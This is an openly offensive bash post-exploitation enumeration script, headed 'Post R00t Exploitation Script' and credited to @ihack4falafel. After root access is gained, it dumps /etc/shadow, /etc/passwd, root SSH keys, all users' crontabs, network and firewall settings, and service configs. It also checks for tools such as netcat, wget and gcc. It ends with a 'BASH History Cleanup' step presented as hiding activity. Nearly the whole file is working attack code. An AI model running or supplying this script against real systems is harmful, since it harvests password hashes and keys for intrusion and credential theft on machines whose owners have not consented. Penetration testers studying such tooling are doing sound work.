echo "##################################"
echo "# Post R00t Exploitation Script  #"
echo "#       By @ihack4falafel        #"
echo "##################################"
echo "                                  "
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "@@@@@@@Network Information@@@@@@@@"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "                                  "
echo "Name servers:"
echo "-------------"
echo "             "
cat /etc/resolv.conf
echo "             "
echo "Hosts file:"
echo "-----------"
echo "           "
cat /etc/hosts
echo "           "
echo "IP route table:"
echo "---------------"
echo "               "
route -n
echo "               "
echo "IPtables rules:"
echo "---------------"
echo "               "
iptables -L
echo "               "
echo "Network interface settings:"
echo "---------------------------"
echo "                           "
cat /etc/network/interfaces
echo "                                  "
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "@@@@@@@Password Infrmation@@@@@@@@"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "                                  "
echo "Password file:"
echo "--------------"
echo "             "
cat /etc/passwd
echo "             "
echo "Shadow file:"
echo "------------"
echo "            "
cat /etc/shadow
echo "             "
echo "Root SSH Keys:"
echo "--------------"
echo "              "
echo "authorized_Keys:"
echo "----------------"
cat /root/.ssh/authorized_keys
echo "               "
echo "known_hosts:"
echo "------------"
cat /root/.ssh/known_hosts
echo "                                  "
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "@@@@@@@@Config Information@@@@@@@@"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "                                  "
echo "Lists all users cron:"
echo "---------------------"
echo "               "
for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done
echo "                                  "
echo "SMB Config File:"
echo "----------------"
echo "                "
cat /etc/samba/smb.conf
echo "                                  "
echo "Sys Config File:"
echo "----------------"
echo "                "
cat /etc/sysctl.conf
echo "                                  "
echo "Httpd Config File:"
echo "------------------"
echo "                "
cat /etc/apache2/httpd.conf 
cat /etc/lighttpd.conf 
cat /etc/apache2/apache2.conf 
cat /etc/httpd/conf/httpd.conf 
cat /opt/lampp/etc/httpd.conf
echo "                                  "
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "@@@@@@@@@@OS Information@@@@@@@@@@"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "                                  "
echo "Current version of distro:"
echo "--------------------------"
echo "             "
cat /etc/issue
echo "            "
echo "Kernel version & Arch:"
echo "----------------------"
echo "            "
uname -a
echo "                      "
echo "Host communications:"
echo "--------------------"
echo "                    "
lsof -i
echo "                                  "
echo "Processes running as root:"
echo "--------------------------"
echo "                          "
ps aux | grep root
echo "                                  "
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "@@@@@@@@@@@Installed SW@@@@@@@@@@@"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "                                  "
echo "Check for Python:"
echo "-----------------"
echo "                 "
python --version
echo "                "
echo "Check for MySQL:"
echo "----------------"
echo "                "
mysql --version
echo "               "
echo "Check for wget:"
echo "---------------"
echo "            "
wget --version
echo "            "
echo "Check for Netcat:"
echo "-----------------"
echo "                 "
nc -h
echo "                 "
echo "Check for GCC:"
echo "--------------"
gcc -v
echo "              "
echo "Check for Perl:"
echo "---------------"
echo "               "
perl -v
echo "                                  "
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "@@@@@@@BASH Histroy Cleanup@@@@@@@"
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "                                  "
echo "[+] Cleaning up..."
touch ~/.bash_history
echo "Script has been completed!"



